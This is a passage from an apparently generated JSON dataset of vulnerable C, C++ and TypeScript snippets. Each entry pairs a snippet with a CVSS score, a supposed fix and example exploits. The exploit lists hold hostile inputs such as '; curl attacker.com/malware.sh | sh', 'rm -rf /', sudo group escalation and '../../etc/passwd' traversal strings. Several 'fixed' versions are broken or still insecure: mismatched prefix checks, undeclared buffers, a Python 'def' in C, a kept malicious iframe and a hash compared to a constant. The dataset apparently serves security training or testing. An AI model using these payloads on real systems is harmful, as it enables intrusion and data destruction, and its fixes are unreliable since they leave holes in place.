        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid open_redirect(char *url) {\n    char command[1024];\n    snprintf(command, sizeof(command), \"xdg-open %s\", url);\n    system(command);\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid open_redirect(const char *url) {\n    if (strncmp(url, \"https://example.com/\", 21) != 0) {\n        printf(\"Invalid URL\\n\");\n        return;\n    }\n    char command[1024];\n    snprintf(command, sizeof(command), \"xdg-open %s\", url);\n    system(command);\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL to redirect users to an unintended site.",
            "By inputting 'https://example.com/; rm -rf /', the attacker could attempt to execute additional commands.",
            "Using a crafted URL like 'https://attacker.com/evil.html' can lead to phishing or malware distribution."
        ]
    },
    "c_35": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid set_session_id(char *session_id) {\n    strcpy(session_id, \"fixedsession123\");\n}\n\nint main() {\n    char session_id[50];\n    set_session_id(session_id);\n    printf(\"Session ID: %s\\n\", session_id);\n    return 0;\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid set_session_id(char *session_id) {\n    snprintf(session_id, 50, \"randomsession%ld\", (long)time(NULL));\n}\n\nint main() {\n    char session_id[50];\n    srand((unsigned int)time(NULL));\n    set_session_id(session_id);\n    printf(\"Session ID: %s\\n\", session_id);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can predict or reuse the fixed session ID to hijack a legitimate user's session.",
            "The attacker might use the static session ID in phishing attempts to lure users into authenticated sessions.",
            "If other parts of the application rely on this session ID, an attacker could exploit it to gain unauthorized access."
        ]
    },
    "c_36": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid logData(const char* data) {\\n    static char buffer[1024];\\n    if (strlen(buffer) + strlen(data) + 1 < sizeof(buffer)) {\\n        strcat(buffer, data);\\n        printf(\"Logged Data: %s\\n\", buffer);\\n    }\\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n\\nvoid logData(const char* data) {\\n    static char buffer[1024];\\n    size_t len = strlen(buffer);\\n    if (len + strlen(data) + 1 < sizeof(buffer)) {\\n        strncpy(buffer + len, data, sizeof(buffer) - len - 1);\\n        buffer[len + strlen(data)] = '\\0';\\n        printf(\"Logged Data: %s\\n\", buffer);\\n    } else {\\n        fprintf(stderr, \"Buffer overflow prevented\\n\");\\n    }\\n}",
        "exploit_ways": [
            "An attacker could inject malicious data to cause a buffer overflow if the check is bypassed.",
            "Injecting specific data patterns can lead to information leakage of previously logged sensitive data.",
            "Crafting input that nears the buffer limit can cause unexpected behavior or crashes, aiding in debugging and reverse engineering."
        ]
    },
    "c_37": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(char *user_input) {\n    char response[256];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", user_input);\n    printf(\"%s\", response);\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(char *user_input) {\n    char safe_input[256];\n    snprintf(safe_input, sizeof(safe_input), \"%s\", user_input);\n    for (int i = 0; i < strlen(safe_input); i++) {\n        if (safe_input[i] == '\\r' || safe_input[i] == '\\n') {\n            safe_input[i] = ' ';\n        }\n    }\n    char response[512];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", safe_input);\n    printf(\"%s\", response);\n}",
        "exploit_ways": [
            "An attacker can inject '\\r\\nSet-Cookie: session=malicious' to manipulate cookies.",
            "Could use '\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n<html><body>Malicious Content</body></html>' to return fake responses.",
            "Injecting '\\r\\nLocation: http://malicious.com' can cause redirection to a malicious site."
        ]
    },
    "c_38": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nclass WebServer {\npublic:\n    void handleRequest(const char* request) {\n        if (strcmp(request, \"GET /\") == 0) {\n            printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hello World</body></html>\");\n        }\n    }\n};",
        "cvss_score": 4.3,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nclass WebServer {\npublic:\n    void handleRequest(const char* request) {\n        if (strcmp(request, \"GET /\") == 0) {\n            printf(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nX-Frame-Options: SAMEORIGIN\\r\\nX-XSS-Protection: 1; mode=block\\r\\nStrict-Transport-Security: max-age=31536000; includeSubDomains\\r\\nContent-Security-Policy: default-src 'self'\\r\\n\\r\\n<html><body>Hello World</body></html>\");\n        }\n    }\n};",
        "exploit_ways": [
            "An attacker can use clickjacking to trick users into clicking on elements in the page.",
            "XSS attacks could be performed if additional content is introduced by user input without proper sanitization.",
            "Without HSTS, an attacker might perform man-in-the-middle attacks by downgrading HTTPS connections to HTTP."
        ]
    },
    "c_39": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid send_response(const char *user_input) {\n    char response[256];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", user_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    const char *user_input = \"<script>alert('XSS');</script>\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hacked</body></html>\";\n    send_response(user_input);\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid sanitize_input(char *input) {\n    for (char *p = input; *p; p++) {\n        if (*p == '\\r' || *p == '\\n') {\n            *p = ' ';\n        }\n    }\n}\n\nvoid send_response(const char *user_input) {\n    char sanitized_input[256];\n    strncpy(sanitized_input, user_input, sizeof(sanitized_input));\n    sanitize_input(sanitized_input);\n    char response[512];\n    snprintf(response, sizeof(response), \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>%s</body></html>\", sanitized_input);\n    printf(\"%s\", response);\n}\n\nint main() {\n    const char *user_input = \"<script>alert('XSS');</script>\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hacked</body></html>\";\n    send_response(user_input);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject \\r\\n in the user input to add new headers, potentially redirecting users to malicious sites.",
            "By injecting \\r\\nSet-Cookie: sessionid=maliciouscookie; an attacker can manipulate cookies and take over user sessions.",
            "The attacker could use HTTP response splitting to deliver crafted content that exploits other vulnerabilities on the client side."
        ]
    },
    "c_40": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "void set_session_id(char *session_data) {\n    char buffer[1024];\n    sprintf(buffer, \"Session ID: %s\", session_data);\n}",
        "cvss_score": 3.5,
        "fixed_code": "void set_session_id(const char *session_data) {\n    if (session_data == NULL || strlen(session_data) >= 1024 - 11) {\n        return;\n    }\n    snprintf(buffer, sizeof(buffer), \"Session ID: %s\", session_data);\n}",
        "exploit_ways": [
            "An attacker can predict or set a valid session ID to hijack user sessions.",
            "By setting the session ID to a known value before login, an attacker can maintain control after authentication.",
            "If the session ID is predictable or reused, attackers can exploit this to perform cross-site request forgery (CSRF) attacks."
        ]
    },
    "c_41": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid unsafe_function() {\n    char buffer[1024];\n    FILE *file = fopen(\"/tmp/data.txt\", \"r\");\n    if (file == NULL) {\n        perror(\"Failed to open file\");\n        return;\n    }\n    sleep(1);\n    fgets(buffer, sizeof(buffer), file);\n    fclose(file);\n    printf(\"Read data: %s\\n\", buffer);\n}\n\nint main() {\n    unsafe_function();\n    return 0;\n}",
        "cvss_score": 4.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <sys/stat.h>\n\nvoid safe_function() {\n    char buffer[1024];\n    int fd = open(\"/tmp/data.txt\", O_RDONLY);\n    if (fd == -1) {\n        perror(\"Failed to open file\");\n        return;\n    }\n    sleep(1);\n    ssize_t bytes_read = read(fd, buffer, sizeof(buffer) - 1);\n    if (bytes_read >= 0) {\n        buffer[bytes_read] = '\\0';\n    }\n    close(fd);\n    printf(\"Read data: %s\\n\", buffer);\n}\n\nint main() {\n    safe_function();\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can replace \\/tmp\\/data.txt with a symlink to another file before the sleep call, causing different data to be read.",
            "By creating a new file and deleting it after the file is opened but before it's read, an attacker can control what gets written into \\/tmp\\/data.txt.",
            "Using a timing attack, an attacker might attempt to change the contents of the file during the sleep period, though this is more difficult."
        ]
    },
    "c_42": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid displayPage() {\n    printf(\"<html><head><title>Clickjacking Example</title></head>\");\n    printf(\"<body><iframe src='http://malicious.com' style='position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5;' frameborder=0></iframe>\");\n    printf(\"<h1>Welcome to our site</h1></body></html>\");\n}\n\nint main() {\n    displayPage();\n    return 0;\n}",
        "cvss_score": 3.6,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n\nvoid displayPage() {\n    printf(\"<html><head><title>Clickjacking Example</title></head>\");\n    printf(\"<body style='position:relative;'>\");\n    printf(\"<iframe src='http://malicious.com' style='position:absolute; top:0; left:0; width:100%%; height:100%%; opacity:0.5; pointer-events:none;' frameborder=0></iframe>\");\n    printf(\"<h1>Welcome to our site</h1></body></html>\");\n}\n\nint main() {\n    displayPage();\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent iframe over the legitimate page, tricking users into clicking on hidden malicious elements.",
            "Users might inadvertently submit actions intended for the legitimate site to a malicious site layered beneath it without knowing.",
            "The attacker can manipulate the iframe's content to perform unintended actions on behalf of the user."
        ]
    },
    "c_43": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\\n#include <stdlib.h>\\n\\n#define MAX_URL_LENGTH 256\\n\\ntypedef struct {\\n    char *url;\\n} Requester;\\n\\nvoid fetch_url(Requester *req) {\\n    char command[MAX_URL_LENGTH + 10];\\n    snprintf(command, sizeof(command), \"curl -s %s\", req->url);\\n    system(command);\\n}\\n\\nRequester* create_requester(const char *url) {\\n    Requester *req = (Requester*)malloc(sizeof(Requester));\\n    if (!req) return NULL;\\n    req->url = strdup(url);\\n    return req;\\n}\\n\\nvoid destroy_requester(Requester *req) {\\n    free(req->url);\\n    free(req);\\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <stdio.h>\\n#include <stdlib.h>\\n#include <string.h>\\n\\n#define MAX_URL_LENGTH 256\\n#define ALLOWED_DOMAIN \"example.com\"\\n\\ntypedef struct {\\n    char *url;\\n} Requester;\\n\\nint is_allowed_domain(const char *url) {\\n    const char *domain = strstr(url, ALLOWED_DOMAIN);\\n    return domain && (domain == url || *(domain - 1) == '.' || *(domain - 1) == ':');\\n}\\n\\nvoid fetch_url(Requester *req) {\\n    if (!is_allowed_domain(req->url)) {\\n        fprintf(stderr, \"Domain not allowed\\n\");\\n        return;\\n    }\\n    char command[MAX_URL_LENGTH + 10];\\n    snprintf(command, sizeof(command), \"curl -s %s\", req->url);\\n    system(command);\\n}\\n\\nRequester* create_requester(const char *url) {\\n    Requester *req = (Requester*)malloc(sizeof(Requester));\\n    if (!req) return NULL;\\n    req->url = strdup(url);\\n    return req;\\n}\\n\\nvoid destroy_requester(Requester *req) {\\n    free(req->url);\\n    free(req);\\n}",
        "exploit_ways": [
            "An attacker could provide a URL pointing to an internal network resource, bypassing intended access restrictions.",
            "By injecting additional curl flags, the attacker might be able to perform actions like downloading files from unauthorized locations.",
            "Crafting a malicious URL with specific parameters could lead to unintended data exfiltration or other SSRF attacks."
        ]
    },
    "c_44": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <stdio.h>\n#include <pthread.h>\n\nclass Counter {\npublic:\n    int value;\n\n    Counter() : value(0) {}\n\n    void increment() {\n        value++;\n    }\n};\n\nvoid* threadFunc(void* arg) {\n    Counter* counter = static_cast<Counter*>(arg);\n    for (int i = 0; i < 100000; ++i) {\n        counter->increment();\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t threads[2];\n    Counter counter;\n\n    pthread_create(&threads[0], NULL, threadFunc, &counter);\n    pthread_create(&threads[1], NULL, threadFunc, &counter);\n\n    pthread_join(threads[0], NULL);\n    pthread_join(threads[1], NULL);\n\n    printf(\"Final counter value: %d\\n\", counter.value);\n    return 0;\n}",
        "cvss_score": 6.8,
        "fixed_code": "#include <stdio.h>\n#include <pthread.h>\n\nclass Counter {\npublic:\n    int value;\n    pthread_mutex_t mutex;\n\n    Counter() : value(0) {\n        pthread_mutex_init(&mutex, NULL);\n    }\n\n    void increment() {\n        pthread_mutex_lock(&mutex);\n        value++;\n        pthread_mutex_unlock(&mutex);\n    }\n};\n\nvoid* threadFunc(void* arg) {\n    Counter* counter = static_cast<Counter*>(arg);\n    for (int i = 0; i < 100000; ++i) {\n        counter->increment();\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t threads[2];\n    Counter counter;\n\n    pthread_create(&threads[0], NULL, threadFunc, &counter);\n    pthread_create(&threads[1], NULL, threadFunc, &counter);\n\n    pthread_join(threads[0], NULL);\n    pthread_join(threads[1], NULL);\n\n    printf(\"Final counter value: %d\\n\", counter.value);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could cause the program to output a final counter value that is less than expected due to unsynchronized increments.",
            "If this code is part of a larger system, race conditions could lead to inconsistent state updates or data corruption.",
            "In certain scenarios, an attacker might be able to predict or influence the timing of thread execution to manipulate the counter value."
        ]
    },
    "c_45": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid read_file() {\n    char filename[100];\n    printf(\"Enter file name to read: \");\n    scanf(\"%s\", filename);\n    FILE *file = fopen(filename, \"r\");\n    if (file) {\n        char ch;\n        while ((ch = fgetc(file)) != EOF)\n            putchar(ch);\n        fclose(file);\n    } else {\n        printf(\"Failed to open file\\n\");\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid read_file() {\n    char filename[100];\n    printf(\"Enter file name to read: \");\n    scanf(\"%99s\", filename);\n    if (strncmp(filename, \"safe_dir/\", 8) == 0) {\n        FILE *file = fopen(filename, \"r\");\n        if (file) {\n            char ch;\n            while ((ch = fgetc(file)) != EOF)\n                putchar(ch);\n            fclose(file);\n        } else {\n            printf(\"Failed to open file\\n\");\n        }\n    } else {\n        printf(\"Access denied\\n\");\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"/etc/passwd\" to read system user information.",
            "They could try \"../../../../../../etc/passwd\" to navigate directory structures and access sensitive files.",
            "By entering a non-existent file name, the program may reveal path information in error messages."
        ]
    },
    "c_46": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <stdlib.h>\n\nvoid readFile(char *filename) {\n    FILE *file = fopen(filename, \"r\");\n    if (file == NULL) {\n        perror(\"Error opening file\");\n        return;\n    }\n    char ch;\n    while ((ch = fgetc(file)) != EOF)\n        putchar(ch);\n    fclose(file);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <filename>\\n\", argv[0]);\n        return 1;\n    }\n    readFile(argv[1]);\n    return 0;\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid readFile(char *filename) {\n    char safePath[256];\n    snprintf(safePath, sizeof(safePath), \"./safe_directory/%s\", filename);\n    FILE *file = fopen(safePath, \"r\");\n    if (file == NULL) {\n        perror(\"Error opening file\");\n        return;\n    }\n    char ch;\n    while ((ch = fgetc(file)) != EOF)\n        putchar(ch);\n    fclose(file);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <filename>\\n\", argv[0]);\n        return 1;\n    }\n    readFile(argv[1]);\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "By entering a crafted filename, an attacker might access sensitive configuration files in predictable locations.",
            "Using relative paths and directory traversal sequences, attackers could potentially exploit this vulnerability to view other local files."
        ]
    },
    "c_47": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\ndef load_config(char* filename) {\n    char path[256];\n    snprintf(path, sizeof(path), \"/etc/config/%s.conf\", filename);\n    FILE *file = fopen(path, \"r\");\n    if (file) {\n        char buffer[1024];\n        while (fgets(buffer, sizeof(buffer), file)) {\n            printf(\"%s\", buffer);\n        }\n        fclose(file);\n    } else {\n        perror(\"Failed to open file\");\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\ndef load_config(char* filename) {\n    char path[256];\n    const char *base = \"/etc/config/\";\n    if (strncpy(path, base, sizeof(path)) != NULL && strncat(path, filename, sizeof(path) - strlen(base) - 1) != NULL) {\n        FILE *file = fopen(path, \"r\");\n        if (file) {\n            char buffer[1024];\n            while (fgets(buffer, sizeof(buffer), file)) {\n                printf(\"%s\", buffer);\n            }\n            fclose(file);\n        } else {\n            perror(\"Failed to open file\");\n        }\n    } else {\n        perror(\"Invalid filename\");\n    }\n}",
        "exploit_ways": [
            "An attacker could input a filename like '../shadow' to access sensitive files outside the intended directory.",
            "Crafting a filename with special characters could lead to unintended paths being accessed, such as '../../etc/passwd'.",
            "Using null bytes in the filename might bypass simple checks and allow for path traversal attacks."
        ]
    },
    "c_48": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <stdio.h>\n#include <string.h>\n\nvoid fetchData(const char *url) {\n    char command[256];\n    snprintf(command, sizeof(command), \"wget -qO- %s\", url);\n    system(command);\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <stdio.h>\n#include <string.h>\n#include <curl/curl.h>\n\nvoid fetchData(const char *url) {\n    CURL *curl;\n    CURLcode res;\n    curl = curl_easy_init();\n    if(curl) {\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);\n        res = curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'http://attacker.com/malicious-file' to fetch and execute malicious content on the server.",
            "By using a crafted URL with internal IP addresses like 'http://127.0.0.1/private-data', an attacker can access sensitive data within the internal network.",
            "Exploiting DNS rebinding techniques, attackers could cause SSRF vulnerabilities to interact with services that are only available on private networks."
        ]
    },
    "c_49": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <stdio.h>\\n\\nstruct WebServer {\\n    void start() {\\n        printf(\"Server started on port 80\\\\n\");\\n    }\\n};",
        "cvss_score": 2.7,
        "fixed_code": "#include <stdio.h>\\n#include <string.h>\\n\\nstruct WebServer {\\n    void start() {\\n        printf(\"Content-Security-Policy: default-src 'self'\\\\n\\\");\\n        printf(\"X-Frame-Options: SAMEORIGIN\\\\n\\\");\\n        printf(\"X-XSS-Protection: 1; mode=block\\\\n\\\");\\n        printf(\"Server started on port 80\\\\n\");\\n    }\\n};",
        "exploit_ways": [
            "An attacker can inject malicious scripts into the page, leading to XSS attacks.",
            "The server is vulnerable to clickjacking since it does not set X-Frame-Options.",
            "Without Content-Security-Policy, an attacker could load resources from untrusted domains."
        ]
    },
    "typescript_0": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "const { exec } = require('child_process');\n\nfunction escalatePrivileges(command) {\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        console.log(`Command output:\\n${stdout}`);\n    });\n}\n\n// Example usage:\nescalatePrivileges(process.argv[2]);",
        "cvss_score": 8.5,
        "fixed_code": "const { exec } = require('child_process');\n\nfunction escalatePrivileges(command) {\n    const allowedCommands = ['whoami', 'ls'];\n    if (!allowedCommands.includes(command)) {\n        console.error('Command not allowed.');\n        return;\n    }\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error executing command: ${error.message}`);\n            return;\n        }\n        console.log(`Command output:\\n${stdout}`);\n    });\n}\n\n// Example usage:\nescalatePrivileges(process.argv[2]);",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files.",
            "Could use 'usermod -aG sudo username' to add a user to the sudo group.",
            "Can chain commands like 'whoami; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "typescript_1": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "const { exec } = require('child_process');\n\nfunction runCommand(command) {\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            console.error(`Error: ${error.message}`);\n            return;\n        }\n        if (stderr) {\n            console.error(`Stderr: ${stderr}`);\n            return;\n        }\n        console.log(`Stdout: ${stdout}`);\n    });\n}\n\nconst userInput = process.argv[2];\nrunCommand(userInput);",
        "cvss_score": 8.5,
        "fixed_code": "const { exec } = require('child_process');\n\nfunction runAllowedCommand(command) {\n    const allowedCommands = ['ls', 'whoami'];\n    if (allowedCommands.includes(command)) {\n        exec(command, (error, stdout, stderr) => {\n            if (error) {\n                console.error(`Error: ${error.message}`);\n                return;\n            }\n            if (stderr) {\n                console.error(`Stderr: ${stderr}`);\n                return;\n            }\n            console.log(`Stdout: ${stdout}`);\n        });\n    } else {\n        console.error('Command not allowed');\n    }\n}\n\nconst userInput = process.argv[2];\nrunAllowedCommand(userInput);",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "typescript_2": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "class User {\n    constructor(data) {\n        Object.assign(this, data);\n    }\n}\n\nfunction deserializeUser(serializedData) {\n    return new User(JSON.parse(serializedData));\n}",
        "cvss_score": 7.5,
        "fixed_code": "class User {\n    constructor(data) {\n        if (typeof data === 'object' && data !== null) {\n            Object.assign(this, data);\n        } else {\n            throw new Error('Invalid data type');\n        }\n    }\n}\n\nfunction deserializeUser(serializedData) {\n    try {\n        const parsedData = JSON.parse(serializedData);\n        if (typeof parsedData === 'object' && parsedData !== null) {\n            return new User(parsedData);\n        } else {\n            throw new Error('Invalid data format');\n        }\n    } catch (e) {\n        throw new Error('Failed to deserialize user: ' + e.message);\n    }\n}",
        "exploit_ways": [
            "An attacker can inject malicious JSON that replaces the User object with a prototype polluting payload.",
            "Could craft a serialized input to execute arbitrary code if the application improperly handles deserialized objects.",
            "Injecting specially crafted data could lead to denial of service by causing excessive resource consumption."
        ]
    },
    "typescript_3": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class AuthService {\\n    private static readonly SECRET_KEY = \"supersecretkey\";\\n    private token: string | null = null;\\n\\n    authenticate(password: string): boolean {\\n        const hash = this.hashPassword(password);\\n        if (hash === AuthService.SECRET_KEY) {\\n            this.token = this.generateToken();\\n            return true;\\n        }\\n        return false;\\n    }\\n\\n    private hashPassword(password: string): string {\\n        // Simple hashing logic for demonstration purposes\\n        let hash = 0;\\n        if (password.length === 0) return String(hash);\\n        for (let i = 0; i < password.length; i++) {\\n            const char = password.charCodeAt(i);\\n            hash = ((hash << 5) - hash) + char;\\n            hash |= 0; // Convert to 32bit integer\\n        }\\n        return String(hash);\\n    }\\n\\n    private generateToken(): string {\\n        return \"token_\" + Math.random().toString(36).substr(2, 9);\\n    }\\n\\n    getToken(): string | null {\\n        return this.token;\\n    }\\n}",
        "cvss_score": 8.5,
        "fixed_code": "class AuthService {\\n    private static readonly SECRET_KEY = \"supersecretkey\";\\n    private token: string | null = null;\\n\\n    authenticate(password: string): boolean {\\n        const hash = this.hashPassword(password);\\n        if (hash === AuthService.SECRET_KEY) {\\n            this.token = this.generateToken();\\n            return true;\\n        }\\n        return false;\\n    }\\n\\n    private hashPassword(password: string): string {\\n        const crypto = require('crypto');\\n        return crypto.createHash('sha256').update(password).digest('hex');\\n    }\\n\\n    private generateToken(): string {\\n        const jwt = require('jsonwebtoken');\\n        return jwt.sign({ user: 'admin' }, AuthService.SECRET_KEY, { expiresIn: '1h' });\\n    }\\n\\n    getToken(): string | null {\\n        return this.token;\\n    }\\n}",
        "exploit_ways": [
            "An attacker can use brute force to find the correct password hash.",
            "If the SECRET_KEY is compromised, an attacker can generate valid tokens.",
            "Using common weak passwords or default credentials could lead to unauthorized access."
        ]
    },
    "typescript_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "const express = require('express');\nconst { exec } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/run', (req, res) => {\n    const command = req.body.cmd;\n    exec(command, (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "cvss_score": 8.2,
        "fixed_code": "const express = require('express');\nconst { execFile } = require('child_process');\n\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst allowedCommands = ['ls', 'whoami'];\n\napp.post('/run', (req, res) => {\n    const command = req.body.cmd;\n    if (!allowedCommands.includes(command)) {\n        res.send('Command not allowed');\n        return;\n    }\n    execFile(command, [], (error, stdout, stderr) => {\n        if (error) {\n            res.send(`Error: ${stderr}`);\n            return;\n        }\n        res.send(stdout);\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on port 3000');\n});",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use '; cat /etc/passwd' to leak sensitive information.",
            "Possible to execute remote commands like '; curl attacker.com/malware.sh | sh'."
        ]
    },
    "typescript_5": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\\n    private filePath: string;\\n\\n    constructor(path: string) {\\n        this.filePath = path;\\n    }\\n\\n    public readFile(): string {\\n        const fs = require('fs');\\n        return fs.readFileSync(this.filePath, 'utf8');\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\\n    private basePath: string;\\n    private filePath: string;\\n\\n    constructor(basePath: string, path: string) {\\n        this.basePath = basePath;\\n        this.filePath = path;\\n    }\\n\\n    public readFile(): string {\\n        const fs = require('fs');\\n        const resolvedPath = require('path').resolve(this.basePath, this.filePath);\\n        if (!resolvedPath.startsWith(this.basePath)) {\\n            throw new Error('Invalid file path');\\n        }\\n        return fs.readFileSync(resolvedPath, 'utf8');\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '../..' to traverse directories and access files outside the intended directory.",
            "Could use URL-encoded sequences like '..%2f' to bypass simple filters and navigate up the directory tree.",
            "By providing a crafted path, an attacker might be able to read sensitive configuration or log files."
        ]
    },
    "typescript_6": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/transfer', (req, res) => {\n    const { toAccount, amount } = req.body;\n    // Simulate transferring funds without CSRF protection\n    console.log(`Transferring ${amount} to account ${toAccount}`);\n    res.send('Transfer successful');\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 7.5,
        "fixed_code": "const express = require('express');\nconst csrf = require('csurf');\nconst app = express();\napp.use(express.json());\nconst csrfProtection = csrf({ cookie: true });\n\napp.post('/transfer', csrfProtection, (req, res) => {\n    const { toAccount, amount } = req.body;\n    // Simulate transferring funds with CSRF protection\n    console.log(`Transferring ${amount} to account ${toAccount}`);\n    res.send('Transfer successful');\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker could trick a logged-in user to visit a malicious website that sends a POST request to the /transfer endpoint.",
            "By using social engineering tactics, attackers can get users to click on links that execute CSRF attacks without their knowledge.",
            "Attackers can embed malicious scripts in iframes or images on other sites that target the vulnerable application."
        ]
    },
    "typescript_7": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\n    private filePath: string;\n\n    constructor(path: string) {\n        this.filePath = path;\n    }\n\n    public readFile(): string {\n        const fs = require('fs');\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\n    private basePath: string;\n    private filePath: string;\n\n    constructor(basePath: string, path: string) {\n        this.basePath = basePath;\n        this.filePath = this.sanitizePath(path);\n    }\n\n    private sanitizePath(path: string): string {\n        return path.replace(/\\.{2,}/g, '');\n    }\n\n    public readFile(): string {\n        const fs = require('fs');\n        const fullPath = this.basePath + '/' + this.filePath;\n        return fs.readFileSync(fullPath, 'utf8');\n    }\n}",
        "exploit_ways": [
            "An attacker could input '../etc/passwd' to read the system's passwd file.",
